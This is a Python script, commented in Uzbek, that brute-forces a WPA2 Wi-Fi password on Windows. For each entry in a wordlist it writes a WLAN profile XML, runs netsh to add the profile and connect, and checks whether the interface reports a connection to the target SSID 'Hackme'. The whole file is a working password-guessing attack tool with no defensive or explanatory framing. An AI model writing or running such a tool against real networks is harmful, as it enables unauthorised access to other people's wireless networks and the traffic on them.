import os
import time
import subprocess

# Sozlamalar
ssid = "Hackme"
wordlist_file = "wordlist2.txt"
xml_file = "temp_wifi_profile.xml"

# XML fayl yaratish funksiyasi
def create_xml(ssid, password):
    return f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
'''

# Fayl mavjudligini tekshirish
if not os.path.exists(wordlist_file):
    print(f"❌ Fayl topilmadi: {wordlist_file}")
    exit(1)

# Parollarni o‘qish
with open(wordlist_file, "r", encoding="utf-8") as f:
    passwords = [line.strip() for line in f if len(line.strip()) >= 8]

print(f"{len(passwords)} ta parol sinovdan o‘tadi...\n")

# Har bir parolni sinash
for index, password in enumerate(passwords, start=1):
    print(f"[{index}] Sinov: {password} ...", end=' ')

    # XML fayl yaratish
    with open(xml_file, "w", encoding="utf-8") as f:
        f.write(create_xml(ssid, password))

    # Eski profilni o‘chirish va yangi profilni qo‘shish
    subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename={xml_file}'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Tizimga ulanib olishini kutish
    time.sleep(1)

    # Wi-Fi holatini tekshirish
    result = subprocess.run(
        ["netsh", "wlan", "show", "interfaces"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        encoding="utf-8"
    )
    
    # Natijani tekshirish
    if result.stdout and ssid in result.stdout and "State                  : connected" in result.stdout:
        print(f"\n\n✅ PAROL TOPILDI: {password}")
        if os.path.exists(xml_file):
            os.remove(xml_file)
        exit(0)
    else:
        print("❌ Noto‘g‘ri")

# To‘g‘ri parol topilmagan bo‘lsa
print("\n❌ To‘g‘ri parol topilmadi.")
if os.path.exists(xml_file):
    os.remove(xml_file)
